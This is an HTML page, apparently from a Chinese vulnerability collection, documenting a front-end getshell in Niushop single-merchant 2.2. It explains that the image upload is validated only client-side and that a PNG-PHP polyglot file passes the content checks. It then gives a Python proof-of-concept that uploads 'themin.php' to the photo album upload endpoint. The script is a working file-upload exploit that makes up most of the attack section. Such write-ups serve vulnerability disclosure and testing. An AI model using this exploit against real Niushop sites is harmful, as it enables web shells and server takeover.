<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="niushop-单商户-22-前台getshell"><span class="csDE05BCC">Niushop </span><span class="csECDA2D3">单商户</span><span class="csDE05BCC"> 2.2 </span><span class="csECDA2D3">前台</span><span class="csDE05BCC">getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Version</span><span class="cs9C1B1871">：单商户</span><span class="cs8926E06"> 2.2</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="Web安全/Niushop/Niushop%20%e5%8d%95%e5%95%86%e6%88%b7%202.2%20%e5%89%8d%e5%8f%b0getshell_files/image0.jpg" width="560" height="354" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上传图片只做了前端校验，抓包改后缀即可绕过。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对文件内容做了检查，文件大小不能过大或过小，合成马最好放到中间。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">请求包截图，删除不必要的参数仍旧能够上传。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Niushop/Niushop%20%e5%8d%95%e5%95%86%e6%88%b7%202.2%20%e5%89%8d%e5%8f%b0getshell_files/image1.jpg" width="560" height="439" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以导致</span><span class="csE3F655E4">前台</span><span class="cs5BEC2C28">getshell</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">paramsGet = {&quot;s&quot;:&quot;/wap/upload/photoalbumupload&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">paramsPost = {&quot;file_path&quot;:&quot;upload/goods/&quot;,&quot;album_id&quot;:&quot;30&quot;,&quot;type&quot;:&quot;1,2,3,4&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">paramsMultipart = [(&#39;file_upload&#39;, (&#39;themin.php&#39;, &quot;\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82&lt;? php phpinfo(); ?&gt;&quot;, &#39;application/octet-stream&#39;))]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers = {&quot;Accept&quot;:&quot;application/json, text/javascript, */*; q=0.01&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,&quot;Referer&quot;:&quot;http://127.0.0.1/index.php?s=/admin/goods/addgoods&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;en&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cookies = {&quot;action&quot;:&quot;finish&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">response = session.post(&quot;http://127.0.0.1/index.php&quot;, data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;Status code: &nbsp;&nbsp;%i&quot; % response.status_code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;Response body: %s&quot; % response.content)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://y4er.com/post/niushop-getshell/</span></p></body>
</html>
